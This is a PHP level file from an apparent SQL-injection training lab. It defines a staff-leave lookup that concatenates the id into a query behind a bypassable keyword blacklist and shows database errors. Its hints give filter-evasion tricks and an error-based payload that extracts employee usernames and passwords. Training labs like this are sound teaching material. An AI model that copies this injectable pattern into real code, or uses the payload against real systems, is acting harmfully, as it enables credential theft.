<?php
// Less-26 外出登记查询
if (!defined('SQLI_MALL')) { die('forbidden'); }
return [
  'title' => '外出登记查询',
  'desc'  => '查询员工外出报备记录。',
  'method' => 'GET',
  'form' => ['method' => 'GET', 'fields' => array (
  'id' => '报备单号',
), 'submit' => '查 询'],
  'difficulty' => 4,
  'task' => 'or/and/注释/空格/斜杠全被过滤，报错注入照打——空格用别的字符替代',
  'hints' => array (
  0 => '过滤了 or、and、/*、--、#、空格、斜杠。报错仍回显，所以思路还是报错注入。',
  1 => '空格替代：%0a、%09、%0b、%0c，或用括号省掉空格；or/and 用双写 oorr/aandnd。',
  2 => '示例：?id=1\'%0aand%0aextractvalue(1,concat(0x7e,(select group_concat(username,0x3a,passwoorrd) from oa_employee),0x7e))%0aand%0a\'1\'=\'1',
),
  'run' => function ($app) {
    if (!isset($_GET['id'])) return $app->info('请输入报备单号。');
    $id = $_GET['id'];
    $id = preg_replace('/or/i', '', $id);
    $id = preg_replace('/and/i', '', $id);
    $id = preg_replace('/[\\/\\*]/', '', $id);
    $id = preg_replace('/[--]/', '', $id);
    $id = preg_replace('/[#]/', '', $id);
    $id = preg_replace('/[\\s]/', '', $id);
    $id = preg_replace('/[\\/\\\\]/', '', $id);
    $sql = "SELECT id, wf_no, status FROM oa_workflow WHERE id='{$id}' LIMIT 0,1";
    $res = $app->q($sql);
    $row = $app->fetch($res);
    if ($row) {
    return $app->card(['审批单号' => $row['wf_no'], '当前状态' => $row['status']]);
    }
    return $app->note($app->error());
  },
];
